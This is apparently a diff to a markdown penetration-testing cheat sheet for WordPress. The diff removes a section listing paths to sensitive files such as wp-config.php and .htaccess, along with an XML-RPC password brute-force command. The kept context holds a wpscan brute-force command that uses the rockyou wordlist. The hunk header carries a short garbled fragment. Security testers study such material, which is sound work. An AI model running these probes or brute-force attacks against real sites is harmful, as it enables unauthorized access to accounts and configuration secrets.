@@ -19,33 +19,6 @@ ap at t tt dbe u m cb
 wpscan --url $url --api-token $APIKEY -U admin -P /usr/share/wordlists/rockyou.txt
 ```
 
-## Haax's Trick
-
-```bash
-# Username can be guessed on WordPress since the username will generate a different error message if it doesn't exist.
-
-# Interesting files
-https://monsite.com/robots.txt
-https://monsite.com/feed
-https://monsite.com/readme.html
-https://monsite.com/xmlrpc.php
-
-# Configuration files
-https://monsite.com/.htaccess
-https://monsite.com/wp-config.php
-
-# Directory listing
-https://monsite.com/wp-includes
-
-# XML-RPC attack (https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit)
-# You can bruteforce users
-./wp-xml-brute http://target.com/xmlrpc.php passwords.txt username1
-
-# If by any way you can upload files, go check /upload or /uploads for your files
-
-# Get WPEngine's config file
-/_wpeprivate/config.json
-```
 
 ## Scanning and Enumeration 
 
